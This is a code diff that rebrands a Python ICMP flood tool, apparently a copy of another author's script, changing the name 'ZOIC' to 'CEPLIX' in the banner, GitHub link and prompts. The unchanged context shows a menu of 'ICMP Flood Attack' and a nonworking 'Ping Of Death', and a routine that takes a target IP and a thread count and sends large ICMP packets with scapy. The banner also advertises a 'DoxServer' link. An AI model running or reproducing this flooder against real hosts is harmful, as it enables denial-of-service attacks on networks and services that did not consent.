@@ -5,7 +5,7 @@ import time
 import sys
 from scapy.all import IP, ICMP, send
 
-zoic = "\033[38;5;118m"
+ceplix = "\033[38;5;118m"
 white = "\033[97m"
 red = "\033[38;5;196m"
 green = "\033[38;5;34m"
@@ -13,7 +13,7 @@ clear = "\033[0m"
 
 def logo():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"""{zoic}
+    print(f"""{ceplix}
 ██╗      █████╗ ██╗   ██╗███████╗██████╗     ██████╗ 
 ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██╗
 ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝     █████╔╝
@@ -22,16 +22,16 @@ def logo():
 ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ {clear}
                
 ╔═════════════════════════════════════════════════════╗
-║ {zoic}*{clear} Github    {zoic}:{clear}   https://github.com/madanokr001      ║
-║ {zoic}*{clear} DoxServer {zoic}:{clear}   https://rvlt.gg/PnjMbQwH            ║
-║ {zoic}*{clear} version   {zoic}:{clear}   4.0                                 ║
-║ {zoic}*{clear} ZOIC      {zoic}:{clear}   {zoic}[{clear}{white}LAYER3{clear}{zoic}]{clear}                            ║  
+║ {ceplix}*{clear} Github    {ceplix}:{clear}   https://github.com/ceplix-53        ║
+║ {ceplix}*{clear} DoxServer {ceplix}:{clear}   https://rvlt.gg/PnjMbQwH            ║
+║ {ceplix}*{clear} version   {ceplix}:{clear}   4.0                                 ║
+║ {ceplix}*{clear} CEPLIX    {ceplix}:{clear}   {ceplix}[{clear}{white}LAYER3{clear}{ceplix}]{clear}                            ║  
 ╚═════════════════════════════════════════════════════╝
           
 ╔═════════════════════════════════════════════════════╗
-║ {zoic}[{clear}1{zoic}]{clear} ICMP Flood Attack                               ║
-║ {zoic}[{clear}2{zoic}]{clear} Ping Of Death Attack {zoic}[{clear}{red}NOT WORK{clear}{zoic}]{clear}                 ║                       
-║ {zoic}[{clear}3{zoic}]{clear} Exit ZOIC                                       ║                                 
+║ {ceplix}[{clear}1{ceplix}]{clear} ICMP Flood Attack                               ║
+║ {ceplix}[{clear}2{ceplix}]{clear} Ping Of Death Attack {ceplix}[{clear}{red}NOT WORK{clear}{ceplix}]{clear}                 ║                       
+║ {ceplix}[{clear}3{ceplix}]{clear} Exit CEPLIX                                       ║                                 
 ╚═════════════════════════════════════════════════════╝  
 """)
     
@@ -39,8 +39,8 @@ def layer3():
     while True:
         logo()
         select = input(f"""
-╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
-╚══{zoic}>{clear} """)
+╔═══[{ceplix}root{clear}@{ceplix}ZOIC{clear}]
+╚══{ceplix}>{clear} """)
                                         
         if select == "1" or select.lower() == "1":
             def send_packet(target):
@@ -51,10 +51,10 @@ def layer3():
 
                         send(packet, verbose=False)
 
-                        print(f"[{zoic}ZOIC{clear}] IP Address {zoic}:{clear} {target} {zoic}|{clear} ICMP Packet {zoic}:{clear} {white}65500{clear}")
+                        print(f"[{ceplix}ZOIC{clear}] IP Address {ceplix}:{clear} {target} {ceplix}|{clear} ICMP Packet {ceplix}:{clear} {white}65500{clear}")
 
                 except Exception as e:
-                    print(f"[{red}WARNING{clear}] Check your permissions or install {zoic}Npcap{clear} : https://npcap.com/#download")
+                    print(f"[{red}WARNING{clear}] Check your permissions or install {ceplix}Npcap{clear} : https://npcap.com/#download")
                     time.sleep(2)
                     print(f"{red}......................ERROR......................{clear}")
                     time.sleep(2)
@@ -70,8 +70,8 @@ def layer3():
                 for t in thread_list:
                     t.join()
 
-            target = input(f"[{zoic}ZOIC{clear}] IP {zoic}>{clear} ")
-            threads = int(input(f"[{zoic}ZOIC{clear}] THREAD {zoic}>{clear} "))
+            target = input(f"[{ceplix}CEPLIX{clear}] IP {ceplix}>{clear} ")
+            threads = int(input(f"[{ceplix}CEPLIX{clear}] THREAD {ceplix}>{clear} "))
 
             start_threads(target, threads)
 
